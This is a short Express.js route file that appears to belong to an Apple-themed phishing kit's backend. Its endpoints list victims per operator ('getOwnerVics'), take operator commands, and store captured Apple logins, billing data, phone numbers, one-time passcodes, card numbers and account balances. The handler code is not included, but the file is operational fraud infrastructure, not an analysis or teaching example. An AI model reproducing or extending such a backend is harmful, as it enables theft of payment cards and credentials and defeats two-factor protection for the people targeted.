const express = require("express");
const {
  sendAuRes,
  sendRes,
  getOwnerVics,
  command,
  getInfo,
  submitAppAuth,
  submitBilling,
  submitTelephone,
  submitOtp,
  submitCCAgain,
  submitCC,
  deleteEntry,
  submitBalance,
} = require("../controllers/appleController");

const router = express.Router();

router.post("/", sendRes);
router.post("/au", sendAuRes);
router.get("/customers/:owner", getOwnerVics);
router.post("/command", command);
router.post("/delete", deleteEntry);
router.get("/customers/id/:uniqueid", getInfo);
router.post("/saveAuth", submitAppAuth);
router.post("/saveBilling", submitBilling);
router.post("/saveTelephone", submitTelephone);
router.post("/saveOtp", submitOtp);
router.post("/saveCCAgain", submitCCAgain);
router.post("/saveCC", submitCC);
router.post("/saveBalance", submitBalance);

module.exports = router;
